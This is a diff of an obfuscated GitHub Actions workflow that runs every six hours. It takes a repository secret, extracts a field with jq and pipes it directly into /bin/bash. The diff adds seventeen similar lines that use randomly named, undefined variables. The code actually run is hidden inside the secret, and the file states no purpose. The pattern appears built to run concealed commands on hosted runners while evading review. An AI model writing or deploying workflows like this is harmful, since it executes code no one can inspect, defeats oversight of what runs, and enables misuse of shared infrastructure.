@@ -1,11 +1,9 @@
 name: qiujiusheng0987
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 3/6 * * *'
-
-jobs:  # 15969
+    - cron: '6 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,11 +11,24 @@ jobs:  # 15969
       - uses: actions/checkout@v4
       - name: qiujiusheng0987
         env:
-          x5: ${{ secrets.x5 }}
+          t6: ${{ secrets.t6 }}
         run: |
-          echo $x5 | jq -r .rn97077 | /bin/bash
-          echo $fl85476 | jq -r .gkx445 | /bin/bash
-          echo $mehw14708 | jq -r .mov79870 | /bin/bash
-          echo $k40 | jq -r .eq5 | /bin/bash
-          echo $wyuml814 | jq -r .p23389 | /bin/bash
+          echo $t6 | jq -r .dva320 | /bin/bash
+          echo $gdznt6728 | jq -r .b15606 | /bin/bash
+          echo $y9 | jq -r .px0734 | /bin/bash
+          echo $ynu1 | jq -r .meqml91 | /bin/bash
+          echo $cguic56614 | jq -r .xq08 | /bin/bash
+          echo $vfp06095 | jq -r .jbmt37092 | /bin/bash
+          echo $ns7920 | jq -r .wxbq2824 | /bin/bash
+          echo $xlzjp75313 | jq -r .zhsnv1 | /bin/bash
+          echo $wixb59 | jq -r .jptxt7975 | /bin/bash
+          echo $csxhh64541 | jq -r .xpxl5 | /bin/bash
+          echo $f3 | jq -r .f530 | /bin/bash
+          echo $t83 | jq -r .byg71 | /bin/bash
+          echo $k9 | jq -r .lxgi8 | /bin/bash
+          echo $m46224 | jq -r .p2771 | /bin/bash
+          echo $qd4988 | jq -r .g10 | /bin/bash
+          echo $zkfui330 | jq -r .j5241 | /bin/bash
+          echo $krol40 | jq -r .xi932 | /bin/bash
+          echo $j3306 | jq -r .e6 | /bin/bash
 
